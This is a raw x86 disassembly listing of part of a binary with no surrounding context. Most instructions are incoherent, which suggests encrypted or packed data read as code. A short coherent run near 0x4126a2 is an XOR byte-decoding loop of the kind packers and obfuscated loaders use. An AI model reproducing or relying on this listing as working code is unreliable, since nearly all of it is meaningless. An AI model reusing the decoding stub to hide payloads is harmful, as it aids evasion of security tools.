  412512:	dec    edi
  412513:	test   BYTE PTR [eax+0x0],ch
  412516:	push   0x30
  412518:	rcl    BYTE PTR [esi+0x382ee8fe],cl
  41251e:	call   0xd7c98d4d
  412523:	sub    dh,cl
  412525:	sti    
  412526:	jo     0x412531
  412528:	jmp    0xd97d1265
  41252d:	(bad)
  412530:	je     0x4124c5
  412532:	mov    esi,ebx
  412534:	bnd ret 
  412536:	and    eax,0x356ac972
  41253b:	cmp    eax,DWORD PTR [ecx-0x75]
  41253e:	xor    BYTE PTR [edi-0x25f43879],bl
  412544:	xor    al,0x1
  412546:	pop    eax
  412547:	fstp   TBYTE PTR [ecx+edi*4+0x45]
  41254b:	push   ds
  41254c:	cli    
  41254d:	fild   WORD PTR [edx+edi*4+0x4d]
  412551:	sub    edx,ecx
  412553:	pop    ebx
  412554:	xchg   ecx,eax
  412555:	adc    dl,BYTE PTR [ebx+0x72880e77]
  41255b:	out    dx,eax
  41255c:	or     ebp,esp
  41255e:	inc    ecx
  41255f:	sbb    al,0x4e
  412561:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412562:	and    edx,DWORD PTR [edi-0x5a]
  412565:	pop    bx
  412567:	jno    0x4125a8
  412569:	jp     0x412583
  41256b:	push   ebp
  41256c:	xchg   edx,eax
  41256d:	into   
  41256e:	xchg   esp,eax
  41256f:	les    esi,FWORD PTR [esp+ebp*2+0x3d]
  412573:	dec    esp
  412574:	scas   al,BYTE PTR es:[edi]
  412575:	dec    edx
  412576:	lahf   
  412577:	mov    eax,0x178039e9
  41257c:	cmp    ch,bl
  41257e:	pop    ds
  41257f:	es xchg esi,eax
  412581:	in     al,0xef
  412583:	lea    eax,[esi]
  412585:	lahf   
  412586:	daa    
  412587:	push   eax
  412588:	mov    ah,0x88
  41258a:	sahf   
  41258b:	sbb    al,0xd7
  41258d:	dec    ebx
  41258e:	pop    ecx
  41258f:	std    
  412590:	js     0x4125a3
  412592:	xchg   ebx,eax
  412593:	cmp    bl,BYTE PTR [esi+eax*4-0x52]
  412597:	leave  
  412598:	outs   dx,DWORD PTR ds:[esi]
  412599:	mov    ecx,0xf80a6004
  41259e:	ins    BYTE PTR es:[edi],dx
  41259f:	sbb    bl,al
  4125a1:	sbb    al,0x31
  4125a3:	test   BYTE PTR [esp+edi*4+0x63],dh
  4125a7:	cmp    eax,0x9f1a8743
  4125ac:	sub    al,0x87
  4125ae:	iret   
  4125af:	ins    DWORD PTR es:[edi],dx
  4125b0:	jo     0x412616
  4125b2:	out    dx,eax
  4125b3:	and    al,0x17
  4125b5:	and    esp,ecx
  4125b7:	fstp   DWORD PTR [edi]
  4125b9:	out    0x37,eax
  4125bb:	jmp    0x6f6920f8
  4125c0:	dec    esp
  4125c1:	hlt    
  4125c2:	stos   DWORD PTR es:[edi],eax
  4125c3:	sar    DWORD PTR [esi+0x6b4842e4],1
  4125c9:	mov    al,BYTE PTR [ebx]
  4125cb:	jg     0x412643
  4125cd:	sbb    BYTE PTR [eax],0x9a
  4125d0:	push   es
  4125d1:	es xchg esp,ecx
  4125d4:	repnz mov ch,0xf9
  4125d7:	aas    
  4125d8:	in     al,dx
  4125d9:	and    ecx,DWORD PTR [esi+0x66]
  4125dc:	repz (bad) [ecx+esi*2-0xa]
  4125e1:	icebp  
  4125e2:	ffreep st(6)
  4125e4:	cmp    ebx,edi
  4125e6:	lock clc 
  4125e8:	ja     0x4125f6
  4125ea:	xchg   edx,eax
  4125eb:	gs push 0x3eeedfe7
  4125f1:	dec    edx
  4125f2:	bound  ebx,QWORD PTR [edi+0x62]
  4125f5:	fimul  DWORD PTR [ecx+0x2]
  4125f8:	loopne 0x412679
  4125fa:	and    esi,esi
  4125fc:	pop    esi
  4125fd:	pop    eax
  4125fe:	aas    
  4125ff:	sub    al,0x5e
  412601:	jg     0x41261e
  412603:	fdivp  st(6),st
  412605:	outs   dx,DWORD PTR ds:[esi]
  412606:	fld    DWORD PTR [ecx-0x73]
  412609:	and    bh,ah
  41260b:	outs   dx,BYTE PTR ds:[esi]
  41260c:	or     eax,0xf71d0f96
  412611:	and    DWORD PTR ds:0xf6db985,esp
  412617:	xor    eax,0x7b601671
  41261c:	push   ecx
  41261d:	cld    
  41261e:	test   al,0x2f
  412620:	daa    
  412621:	enter  0x3c3,0x47
  412625:	xchg   edi,eax
  412626:	shr    BYTE PTR [eax+0x60430f38],1
  41262c:	jmp    0xa77f1cc
  412631:	pop    esi
  412632:	aam    0xf3
  412634:	cmp    al,BYTE PTR [edx]
  412636:	adc    esp,DWORD PTR [esi+0x66]
  412639:	out    dx,eax
  41263a:	addr16 leave 
  41263c:	sub    DWORD PTR [edi-0x64ec81e6],esp
  412642:	push   esp
  412643:	pop    ecx
  412644:	sbb    al,0xcc
  412646:	xchg   ebp,eax
  412647:	loopne 0x41268b
  412649:	cmp    BYTE PTR [eax+edi*4],cl
  41264c:	(bad)  
  41264d:	in     al,0xdf
  41264f:	sub    DWORD PTR [eax-0x8],0xfffffff7
  412653:	mov    esp,0x950bd67d
  412658:	sbb    al,0x6c
  41265a:	push   ds
  41265b:	sub    edi,ebp
  41265d:	gs mov bl,0x56
  412660:	rol    BYTE PTR [eax+0x35e042da],cl
  412666:	inc    esi
  412667:	(bad)  
  412668:	cmp    eax,0x83bcdf01
  41266d:	sub    al,0x9d
  41266f:	xor    DWORD PTR ss:[ebx+ebp*8+0x43],ecx
  412674:	xchg   cl,cl
  412676:	test   bl,cl
  412678:	aam    0x91
  41267a:	mov    ebx,0x7b0d0d8a
  41267f:	(bad)  
  412680:	clc    
  412681:	add    BYTE PTR [ebx-0x69],dl
  412684:	xlat   BYTE PTR ds:[ebx]
  412685:	xchg   BYTE PTR [ecx],al
  412687:	pop    edx
  412688:	pop    ebx
  412689:	mov    esp,0x3f8a2ee
  41268e:	or     DWORD PTR [esi+0x1bd3d092],ecx
  412694:	fimul  DWORD PTR [esi]
  412696:	in     al,dx
  412697:	dec    eax
  412698:	mov    ch,BYTE PTR [edi-0x24]
  41269b:	dec    eax
  41269c:	jne    0x4126b8
  4126a2:	xor    eax,esi
  4126a4:	add    eax,edi
  4126a6:	imul   eax,edx
  4126a9:	mov    edx,DWORD PTR [ebp-0x8]
  4126ac:	movzx  eax,BYTE PTR [eax+edx*1]
  4126b0:	mov    edx,DWORD PTR [ebp-0x48]
  4126b3:	jmp    0x4126c9
  4126b8:	xor    eax,esi
  4126ba:	add    eax,edi
  4126bc:	imul   eax,edx
  4126bf:	mov    edx,DWORD PTR [ebp-0x8]
  4126c2:	movzx  eax,BYTE PTR [eax+edx*1]
  4126c6:	mov    edx,DWORD PTR [ebp-0x4c]
  4126c9:	xor    edx,esi
  4126cb:	lea    eax,[edx+eax*1+0x3272db]
  4126d2:	movzx  edx,BYTE PTR [ebp-0x1]
  4126d6:	xor    edx,eax
  4126d8:	mov    BYTE PTR [ebp-0x1],dl
  4126db:	mov    al,BYTE PTR [ebp-0x1]
  4126de:	mov    edx,DWORD PTR [ebp-0x30]
  4126e1:	mov    ebx,DWORD PTR [ebp-0xc]
  4126e4:	xor    edx,esi
  4126e6:	add    edx,edi
  4126e8:	imul   edx,ebx
  4126eb:	mov    ebx,DWORD PTR [ebp-0x1c]
  4126ee:	xor    ebx,esi
  4126f0:	add    edx,ebx
  4126f2:	mov    ebx,DWORD PTR [ebp-0x8]
  4126f5:	mov    BYTE PTR [edx+ebx*1+0x3272db],al
  4126fc:	mov    eax,DWORD PTR [ebp-0x38]
  4126ff:	jmp    0x414a74
  412704:	sbb    ch,BYTE PTR [edx+0xa]
  412707:	sbb    eax,0x65e59d8a
  41270c:	push   eax
  41270d:	mov    ah,0x55
  41270f:	mov    al,0x90
  412711:	lods   eax,DWORD PTR ds:[esi]
  412712:	outs   dx,BYTE PTR ds:[esi]
  412713:	push   0x47
  412715:	push   0x62
  412717:	bound  ecx,QWORD PTR [edx]
  412719:	pop    edi
  41271a:	bound  esp,QWORD PTR [edx-0x29]
  41271d:	cmp    BYTE PTR [ebx],ah
  41271f:	push   0x24
  412721:	mov    edx,0xc513ca73
  412726:	sub    ebx,0xb840fd01
  41272c:	mov    edx,0x65bf12a7
  412731:	leave  
  412732:	je     0x4126ca
  412734:	arpl   WORD PTR [ecx+eax*4+0x4f],dx
  412738:	push   ecx
  412739:	cmp    eax,0xe00fa524
  41273e:	push   cs
  41273f:	mov    bl,0x93
  412741:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412742:	retf   
  412743:	outs   dx,DWORD PTR ds:[esi]
  412744:	dec    eax
  412745:	or     ebp,ecx
  412747:	fisub  DWORD PTR [eax+0x7f]
  41274a:	ins    BYTE PTR es:[edi],dx
  41274b:	loop   0x412739
  41274d:	rcr    BYTE PTR [ebx+0x35],0xfa
  412751:	xor    al,0x65
  412753:	lock xor dh,BYTE PTR [edx-0x7d]
  412757:	retf   0x2073
  41275a:	pushf  
  41275b:	rdmsr  
  41275d:	imul   ebp,DWORD PTR [edi],0xffffffa6
  412760:	(bad)  
  412761:	(bad)  
  412763:	add    bl,BYTE PTR [ecx]
  412765:	lods   eax,DWORD PTR ds:[esi]
  412766:	leave  
  412767:	add    eax,0xb547266b
  41276c:	nop
  41276d:	ss (bad) 
  41276f:	jnp    0x412755
  412771:	push   edi
  412772:	enter  0x1426,0xa2
  412776:	call   0x6234c6e5
  41277b:	mov    ebp,0xca3d17af
  412780:	or     eax,DWORD PTR [eax]
  412782:	sbb    al,0x9a
  412784:	xlat   BYTE PTR ds:[ebx]
  412785:	popf   
  412786:	add    esp,edx
  412788:	shr    BYTE PTR [esi],0xa9
  41278b:	cmp    BYTE PTR [edi],bh
  41278d:	xor    bh,BYTE PTR [ecx-0x10]
  412790:	mov    eax,ds:0x7c94d0d8
  412795:	icebp  
  412796:	xchg   ebp,eax
  412797:	lock stos BYTE PTR es:[edi],al
  412799:	xchg   ecx,eax
  41279a:	jecxz  0x4127e2
  41279c:	shl    DWORD PTR [edi+0x77],0xd9
  4127a0:	outs   dx,DWORD PTR ds:[esi]
  4127a1:	adc    BYTE PTR [eax-0x80],cl
  4127a4:	scas   eax,DWORD PTR es:[edi]
  4127a5:	mov    cl,BYTE PTR [edi-0x1a]
  4127a8:	jns    0x4127fe
  4127aa:	mov    dl,0x61
  4127ac:	cli    
  4127ad:	xor    DWORD PTR [eax-0x6b],ecx
  4127b0:	xor    ah,BYTE PTR [edi]
  4127b2:	xchg   esp,eax
  4127b3:	into   
  4127b4:	retf   
  4127b5:	scas   al,BYTE PTR es:[edi]
  4127b6:	inc    eax
  4127b7:	es pop esp
  4127b9:	sub    eax,0x95fdf9a9
  4127be:	repz ja 0x412758
  4127c1:	sbb    ah,BYTE PTR [eax+0x723930b3]
  4127c7:	inc    esp
  4127c8:	retf   
  4127c9:	jb     0x4127fa
  4127cb:	call   0x2832:0x71904c22
  4127d2:	test   al,0x17
  4127d4:	sbb    al,0x33
  4127d6:	sbb    ecx,DWORD PTR [ebx-0x4b]
  4127d9:	jne    0x4127c8
  4127db:	or     dl,bh
  4127dd:	stc    
  4127de:	add    al,0xb9
  4127e0:	test   al,0x45
  4127e2:	xor    bl,bl
  4127e4:	pop    ebp
  4127e5:	and    al,BYTE PTR [ebx-0x72ce16d2]
  4127eb:	fcmovnb st,st(1)
  4127ed:	mov    dl,0xaa
  4127ef:	inc    esi
  4127f0:	push   ebx
  4127f1:	gs sub al,0x1e
  4127f4:	cmp    al,0x21
  4127f6:	loopne 0x412790
  4127f8:	popf   
  4127f9:	ss data16 out 0x68,al
  4127fd:	test   BYTE PTR [edx],al
  4127ff:	stc    
  412800:	jge    0x4127e9
  412802:	xchg   ebp,eax
  412803:	clc    
  412804:	sub    dl,BYTE PTR [edx]
  412806:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412807:	test   esi,ebp
  412809:	mov    BYTE PTR [edx],al
  41280b:	(bad)  
  41280c:	aad    0x71
  41280e:	push   di
  412810:	ffree  st(7)
  412812:	je     0x412878
  412814:	mov    al,ds:0x1598458
  412819:	ins    DWORD PTR es:[edi],dx
  41281a:	xor    al,0x7e
  41281c:	lea    esp,[ebx+ecx*4+0x35068c55]
  412823:	data16 mov BYTE PTR [esi-0x3a9603e6],dh
  41282a:	shl    BYTE PTR [esp+eiz*4+0x158185e7],cl
  412831:	add    BYTE PTR [edi],0xbf
  412834:	mov    ebx,0x29337baf
  412839:	mov    eax,ds:0x3d7d7f90
  41283e:	mov    al,ds:0x94549a8d
  412843:	repnz or BYTE PTR [ebp+0x5bcdfa56],bh
  41284a:	les    edi,FWORD PTR [eax-0x4d252b6f]
  412850:	mov    DWORD PTR [ebx],edx
  412852:	and    al,0x42
  412854:	sbb    al,0xd0
  412856:	(bad)  
  412857:	test   DWORD PTR [ebx],0x1fc910ce
  41285d:	repz in al,0x14
  412860:	enter  0x2b25,0x84
  412864:	jnp    0x412863
  412866:	push   cs
  412867:	loop   0x412882
  412869:	ret    0x7f74
  41286c:	pop    esp
  41286d:	push   ebx
  41286e:	ja     0x412830
  412870:	mov    fs,WORD PTR [eax]
  412872:	sti    
  412873:	call   0x99dcdff5
  412878:	inc    ecx
  412879:	jne    0x4127fc
  41287b:	data16 sti 
  41287d:	mov    bl,0x7c
  41287f:	js     0x41282e
  412881:	scas   eax,DWORD PTR es:[edi]
  412882:	(bad)  
  412883:	mov    eax,ds:0x34d1d810
  412888:	and    BYTE PTR [ecx+0x1f],bh
  41288b:	and    DWORD PTR [esi-0x5c],esi
  41288e:	dec    ecx
  41288f:	loope  0x4128f6
  412891:	mov    dl,al
  412893:	adc    eax,0x802bde8c
  412898:	mov    DWORD PTR [edi+eiz*1],ebp
  41289b:	mov    al,ds:0xea4e3666
  4128a0:	cdq    
  4128a1:	(bad)  
  4128a3:	retf   0xbed6
  4128a6:	lahf   
  4128a7:	mov    esi,0x16525f5f
  4128ac:	ret    
  4128ad:	or     eax,0x6e676947
  4128b2:	dec    edi
  4128b3:	(bad)  
  4128b4:	xchg   ecx,eax
  4128b5:	adc    DWORD PTR [ecx-0x5f703001],ecx
  4128bb:	add    eax,0x7f1d1998
  4128c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4128c1:	imul   esi,DWORD PTR [ecx+ebp*8-0xc],0x3d4a4795
  4128c9:	jb     0x4128aa
  4128cb:	cmp    eax,0x64e4dcd5
  4128d0:	jne    0x4128a5
  4128d2:	xchg   DWORD PTR [ecx+0x57fbac77],edx
  4128d8:	cwde   
  4128d9:	inc    ecx
  4128da:	xchg   ebp,eax
  4128db:	mov    esi,0xe7d6cc70
  4128e0:	pop    edx
  4128e1:	and    edx,0xffffffe8
  4128e4:	mov    ch,0xec
  4128e6:	inc    edx
  4128e7:	inc    eax
  4128e8:	pop    es
  4128e9:	sub    al,BYTE PTR [edx+edx*8+0x69]
  4128ed:	or     ch,BYTE PTR [edx+0x22fb785a]
  4128f3:	cdq    
  4128f4:	test   DWORD PTR [eax+0x6c],ecx
  4128f7:	jno    0x4128e8
  4128f9:	sbb    DWORD PTR [esi+0x59],eax
  4128fc:	mov    ebp,0x4f61a7ca
  412901:	dec    edi
  412902:	stos   BYTE PTR es:[edi],al
  412903:	pusha  
  412904:	push   es
  412905:	jbe    0x4128bc
  412907:	inc    eax
  412908:	int    0xdd
  41290a:	xchg   ecx,eax
  41290b:	ret    
  41290c:	sub    DWORD PTR [eax+0x18],esi
  41290f:	fisub  DWORD PTR [ebp-0x6f]
  412912:	mov    ah,0xf6
  412914:	pushf  
  412915:	push   0x26
  412917:	xor    edi,DWORD PTR [edx+0x61758891]
  41291d:	push   ds
  41291e:	adc    ah,dh
  412920:	pop    ebp
  412921:	(bad)  
  412922:	lods   al,BYTE PTR ds:[esi]
  412923:	mov    ds:0x2ba94c34,al
  412928:	pusha  
  412929:	shr    DWORD PTR [ebx-0x4a],0xf7
  41292d:	add    al,0xac
  41292f:	xlat   BYTE PTR ds:[ebx]
  412930:	jle    0x4128d0
  412932:	or     cl,BYTE PTR [ecx-0x342e97cd]
  412938:	push   0xe9ed0c4b
  41293d:	cli    
  41293e:	cmp    eax,0x8a548776
  412943:	sti    
  412944:	push   ecx
  412945:	add    al,0x18
  412947:	inc    ebx
  412948:	enter  0x3b06,0x3a
  41294c:	iret   
  41294d:	pop    edx
  41294e:	sahf   
  41294f:	push   0x3f3b26ab
  412954:	into   
  412955:	dec    edx
  412956:	jne    0x412944
  412958:	sbb    al,0x5b
  41295a:	sar    DWORD PTR ss:[eax],cl
  41295d:	sub    BYTE PTR [edi-0x7861d806],ah
  412963:	xchg   esi,eax
  412964:	jge    0x41298e
  412966:	mov    eax,0xbe7bcb73
  41296b:	cmc    
  41296c:	xchg   edi,eax
  41296d:	jmp    0xdd34bcdd
  412972:	ja     0x412984
  412974:	push   0xc7806de3
  412979:	mov    ch,0xe2
  41297b:	mov    esi,0x9107485b
  412980:	mov    cs,WORD PTR [ecx-0x4b]
  412983:	inc    sp
  412985:	hlt    
  412986:	jnp    0x4129ca
  412988:	dec    edx
  412989:	fild   QWORD PTR [ecx-0x165c8149]
  41298f:	pop    ebx
  412990:	scas   eax,DWORD PTR es:[edi]
  412991:	jns    0x412979
  412993:	(bad)  
  412995:	jge    0x4129ab
  412997:	icebp  
  412998:	xchg   edi,eax
  412999:	dec    edi
  41299a:	add    BYTE PTR [ebp+0x6],bl
  41299d:	ret    
  41299e:	test   eax,0x3d5f8275
  4129a3:	retf   
  4129a4:	pop    esp
  4129a5:	jmp    DWORD PTR [ecx+0x2c54fe5b]
  4129ab:	test   dh,al
  4129ad:	mov    cl,0x9d
  4129af:	fwait
  4129b0:	sub    DWORD PTR [eax-0x4b],0x46f6a9c3
  4129b7:	pop    esi
  4129b8:	cmp    esi,esp
  4129ba:	jno    0x4129dd
  4129bc:	sbb    al,0x0
  4129be:	ret    
  4129bf:	in     al,dx
  4129c0:	push   ds
  4129c1:	add    eax,0xa9558972
  4129c6:	lahf   
  4129c7:	xor    al,0xad
  4129c9:	inc    eax
  4129ca:	bound  ebp,QWORD PTR [ecx+0x59]
  4129cd:	add    DWORD PTR [ebp+0x1e199145],0x71
  4129d4:	xlat   BYTE PTR ds:[ebx]
  4129d5:	outs   dx,BYTE PTR ds:[esi]
  4129d6:	adc    edx,DWORD PTR [edi+edi*2-0x4d]
  4129da:	mov    ecx,0xf8d99e86
  4129df:	(bad)  
  4129e1:	pop    ebx
  4129e2:	(bad)  
  4129e3:	fsubr  DWORD PTR [edi-0x33f6b20b]
  4129e9:	ins    DWORD PTR es:[edi],dx
  4129ea:	mov    ebp,0x5ec76cc7
  4129ef:	mov    dh,0xdf
  4129f1:	sbb    eax,0xce17e743
  4129f6:	mov    edx,0x9907b12b
  4129fb:	fwait
  4129fc:	xor    DWORD PTR [edi-0x47cf140],0x407804ba
  412a06:	ja     0x412a24
  412a08:	stos   BYTE PTR es:[edi],al
  412a09:	aam    0x39
  412a0b:	and    edx,eax
  412a0d:	outs   dx,BYTE PTR ds:[esi]
  412a0e:	and    al,ch
  412a10:	es popa 
  412a12:	adc    DWORD PTR ds:0xc582f44e,edi
  412a18:	mov    ecx,DWORD PTR [ebp+0x56b2b728]
  412a1e:	fidivr WORD PTR ds:0x1e9e05a9
  412a24:	mov    al,ds:0x777f1fa1
  412a29:	dec    ebx
  412a2a:	push   ecx
  412a2b:	dec    bp
  412a2d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412a2e:	mov    ebx,0xdccb6d76
  412a33:	mov    bh,0x65
  412a35:	fdecstp 
  412a37:	or     DWORD PTR [ebp+0x3d],ebx
  412a3a:	imul   edx,DWORD PTR [edi+0x4a01b311],0x323e99e2
  412a44:	in     al,0xba
  412a46:	sub    al,0xa
  412a48:	js     0x412a8a
  412a4a:	cli    
  412a4b:	pop    edi
  412a4d:	ins    BYTE PTR es:[edi],dx
  412a4e:	sbb    edi,DWORD PTR [edx+0x0]
  412a51:	mov    ah,0xaf
  412a53:	mov    al,0x0
  412a55:	loopne 0x4129e5
  412a57:	pushf  
  412a58:	mov    esi,0xf1aac236
  412a5d:	loop   0x412a75
  412a5f:	sub    edx,DWORD PTR [edx]
  412a61:	or     DWORD PTR gs:[ecx],edi
  412a64:	(bad)  
  412a65:	loope  0x412a2f
  412a67:	push   edx
  412a68:	aas    
  412a69:	cmp    BYTE PTR [edi+0x12],bl
  412a6c:	adc    eax,0xbe31e1f0
  412a71:	sub    DWORD PTR gs:[ecx],edx
  412a74:	or     bh,al
  412a76:	xchg   esp,eax
  412a77:	xor    ebx,eax
  412a79:	and    BYTE PTR [ebp+0x20],cl
  412a7c:	mov    BYTE PTR [edx-0x14],bl
  412a7f:	dec    edx
  412a80:	lds    esi,FWORD PTR [ebp-0x6f68ef6a]
  412a86:	xlat   BYTE PTR ds:[ebx]
  412a87:	in     al,dx
  412a88:	das    
  412a89:	cmc    
  412a8a:	inc    esp
  412a8b:	test   DWORD PTR [ebp+0x146afc07],esp
  412a91:	jecxz  0x412aee
  412a93:	fstp   QWORD PTR [ebx]
  412a95:	inc    ebx
  412a96:	fwait
  412a97:	ja     0x412b02
  412a99:	in     al,dx
  412a9a:	call   0x5379c5f8
  412a9f:	aam    0xfc
  412aa1:	jecxz  0x412ae7
  412aa3:	sbb    BYTE PTR [ecx+0x1d8b6ed9],dh
  412aa9:	inc    ebp
  412aaa:	test   DWORD PTR [edi+0x6a],esi
  412aad:	(bad)  
  412aae:	ja     0x412b00
  412ab0:	xchg   ebx,eax
  412ab1:	jp     0x412ac5
  412ab3:	push   0x347ce3f0
  412ab8:	rcl    DWORD PTR [eax],0xba
  412abb:	sub    bh,cl
  412abd:	jmp    0x412a67
  412abf:	into   
  412ac0:	push   esp
  412ac1:	ja     0x412a49
  412ac3:	or     edx,edi
  412ac5:	in     al,0x9f
  412ac7:	call   0x486f:0xfb7d2629
  412ace:	(bad)  
  412acf:	je     0x412a57
  412ad1:	lahf   
  412ad2:	and    ebx,DWORD PTR [eax-0x29]
  412ad5:	push   eax
  412ad6:	shl    BYTE PTR [edx+0x34],1
  412ad9:	in     eax,0x5f
  412adb:	repnz fidivr DWORD PTR [edx-0x2]
  412adf:	mov    esp,0xb7489cb2
  412ae4:	cmp    ebx,esp
  412ae6:	idiv   BYTE PTR [eax]
  412ae8:	retw   0x87ed
  412aec:	or     eax,0xa2ec548a
  412af1:	push   es
  412af2:	popa   
  412af3:	enter  0xa990,0x3f
  412af7:	fst    QWORD PTR [edi]
  412af9:	mov    edx,0x9ba979b9
  412afe:	cmc    
  412aff:	js     0x412a9d
  412b01:	ret    0x644d
  412b04:	(bad)  
  412b05:	jmp    0x412afe
  412b07:	cs mov ebx,0x65240974
  412b0d:	push   es
  412b0e:	in     eax,dx
  412b0f:	dec    esp
  412b10:	test   BYTE PTR [edi-0x2d],bh
  412b13:	cdq    
  412b14:	dec    ebp
  412b15:	mov    dh,0x4d
  412b17:	xor    ecx,ecx
  412b19:	mov    ebx,0x95845964
  412b1e:	dec    edx
  412b1f:	in     al,dx
  412b20:	xchg   esp,eax
  412b21:	neg    BYTE PTR [edi+0x307fb6b]
  412b27:	call   0x50ee:0x1ce95541
  412b2e:	out    0xf8,eax
  412b30:	jae    0x412ab6
  412b32:	fwait
  412b33:	and    al,0xa3
  412b35:	(bad)  
  412b36:	ret    
  412b37:	sbb    ecx,DWORD PTR [esi]
  412b39:	ds pop ebx
  412b3b:	mov    ebp,0xad803f99
  412b40:	sbb    BYTE PTR ds:0xf3e0d8b1,al
  412b46:	sub    edx,0xffffffe6
  412b49:	mov    eax,0xd6e60b0b
  412b4e:	and    bh,dl
  412b50:	or     esp,ecx
  412b52:	mov    dl,0xb1
  412b54:	pop    esp
  412b55:	fcom   DWORD PTR [ebx+0x7201ea6c]
  412b5b:	into   
  412b5c:	ja     0x412b1c
  412b5e:	dec    ecx
  412b5f:	sub    al,0x2
  412b61:	movnti DWORD PTR [edi-0x4f368fb8],ecx
  412b68:	fisubr WORD PTR [eax+0x1d]
  412b6b:	inc    esi
  412b6c:	mov    cs,WORD PTR ds:0xbfda2967
  412b72:	jmp    0x412b0d
  412b74:	or     ah,BYTE PTR [eax-0x45890cf3]
  412b7a:	add    al,0xc2
  412b7c:	frstor [ebx+0x144c9d18]
  412b82:	xchg   edi,eax
  412b83:	cmp    esi,edx
  412b85:	(bad)  
  412b86:	sbb    bh,ah
  412b88:	mov    eax,ds:0x96566a55
  412b8d:	push   cs
  412b8e:	jp     0x412c0c
  412b90:	push   edx
  412b91:	aas    
  412b92:	mov    ebp,0xdb9c3817
  412b97:	aad    0x76
  412b99:	jge    0x412bf4
  412b9b:	(bad)  
  412b9c:	and    ebx,edx
  412b9e:	das    
  412b9f:	enter  0x32bc,0x3d
  412ba3:	xchg   ebp,eax
  412ba4:	nop
  412ba5:	sub    eax,0xf968364c
  412baa:	cmp    BYTE PTR [edi+ebx*8-0x1633a588],dl
  412bb1:	pop    DWORD PTR [eax]
  412bb3:	push   ebx
  412bb4:	sar    DWORD PTR es:[edx-0x66],1
  412bb8:	mov    al,ds:0xab85d1f9
  412bbd:	repz cmp al,0x8a
  412bc0:	in     al,dx
  412bc1:	and    eax,DWORD PTR [edi-0x7fb397a7]
  412bc7:	call   0xcfd6:0x4f5ef1e6
  412bce:	xchg   ebx,eax
  412bcf:	imul   ecx,DWORD PTR [ecx+0x7c],0x14edad20
  412bd6:	pop    esi
  412bd7:	test   BYTE PTR [ebp+ebp*1+0x5b],ch
  412bdb:	(bad)  
  412bdc:	pop    edx
  412bdd:	adc    eax,0xffe634db
  412be2:	rol    BYTE PTR [ebp+0x60],1
  412be5:	in     eax,0x70
  412be7:	data16 jno 0x412bfa
  412bea:	and    DWORD PTR [eax+0x92c40fe],0x4479e0a0
  412bf4:	lods   eax,DWORD PTR ds:[esi]
  412bf5:	pusha  
  412bf6:	(bad)  
  412bf7:	lock test eax,0x744f75a0
  412bfd:	jmp    0xb152c388
  412c02:	push   ds
  412c03:	sbb    edi,0x56
  412c06:	ja     0x412bf5
  412c08:	aam    0x8c
  412c0a:	and    cl,dh
  412c0c:	pop    ebx
  412c0d:	mov    edi,0x681793ff
  412c12:	mov    esi,0xdd4d0f27
  412c17:	iret   
  412c18:	std    
  412c19:	and    cl,dh
  412c1b:	sub    DWORD PTR [ebx+0x6d1a1525],esp
  412c21:	xchg   ebp,eax
  412c22:	mov    dl,0x68
  412c24:	jp     0x412bce
  412c26:	mov    ah,BYTE PTR [esi-0x2abde29f]
  412c2c:	jmp    0x412c7f
  412c2e:	cwde   
  412c2f:	or     al,0xdb
  412c31:	push   edi
  412c32:	or     BYTE PTR [ebx],dh
  412c34:	lahf   
  412c35:	jge    0x412cb1
  412c37:	and    edx,esp
  412c39:	mov    bl,0x2b
  412c3b:	or     BYTE PTR [esi+0x456a9a29],bh
  412c41:	xchg   ecx,eax
  412c42:	daa    
  412c43:	repnz out dx,eax
  412c45:	outs   dx,DWORD PTR ds:[esi]
  412c46:	stc    
  412c47:	scas   al,BYTE PTR es:[edi]
  412c48:	jle    0x412bea
  412c4a:	xchg   ebp,eax
  412c4b:	dec    ebx
  412c4c:	outs   dx,DWORD PTR ds:[esi]
  412c4d:	gs loope 0x412bdb
  412c50:	add    edi,ebp
  412c52:	mov    ecx,0xcc3b8d6f
  412c57:	push   ss
  412c58:	lods   eax,DWORD PTR ds:[esi]
  412c59:	xchg   edi,eax
  412c5a:	dec    ebx
  412c5b:	xchg   edi,eax
  412c5c:	or     ebp,DWORD PTR [esi]
  412c5e:	jbe    0x412c50
  412c60:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412c61:	fwait
  412c62:	jecxz  0x412c50
  412c64:	mov    ah,0xa0
  412c66:	pop    ds
  412c67:	push   edx
  412c68:	push   esp
  412c69:	mov    ebp,DWORD PTR [eax]
  412c6b:	pop    ecx
  412c6c:	jle    0x412c8c
  412c6e:	mov    al,ds:0x50ea45e9
  412c73:	jo     0x412c45
  412c75:	xchg   ebp,eax
  412c77:	int3   
  412c78:	xor    ebx,ebx
  412c7a:	push   eax
  412c7b:	test   DWORD PTR [esi-0x2f0c4c3c],esp
  412c81:	in     al,0xf0
  412c83:	xor    al,0xb6
  412c85:	es jbe 0x412c5b
  412c88:	mov    al,ds:0x46abbcf4
  412c8d:	mov    ebp,DWORD PTR [edi]
  412c8f:	and    bl,bh
  412c91:	xchg   esi,eax
  412c92:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412c93:	outs   dx,DWORD PTR ds:[esi]
  412c94:	sbb    eax,0x548409a3
  412c99:	push   ebx
  412c9a:	jg     0x412ce5
  412c9c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412c9d:	lock arpl WORD PTR [ecx-0x20763ab9],ax
  412ca4:	mov    dh,0xa7
  412ca6:	xchg   DWORD PTR [edi+0x53],ecx
  412ca9:	ds mov cl,0x1f
  412cac:	icebp  
  412cad:	mov    bl,BYTE PTR [edx-0x9]
  412cb0:	xor    DWORD PTR [eax+0x76b65a1a],eax
  412cb6:	inc    edi
  412cb7:	jmp    0x412d06
  412cb9:	mov    eax,ds:0x13e820e4
  412cbe:	lea    ebp,[esi+0x17816e62]
  412cc4:	pusha  
  412cc5:	test   eax,0x43ba65c0
  412cca:	cmp    eax,0xcb826fe9
  412ccf:	mov    esi,ecx
  412cd1:	(bad)  
  412cd3:	sub    ecx,DWORD PTR [ecx-0x58]
  412cd6:	mov    ecx,0x258359fb
  412cdb:	xchg   esi,eax
  412cdc:	imul   ebp,DWORD PTR [eax],0xaf953613
  412ce2:	inc    edi
  412ce3:	and    al,BYTE PTR [eax+0x38]
  412ce6:	push   ecx
  412ce7:	xchg   ecx,eax
  412ce8:	and    BYTE PTR [edi],0x72
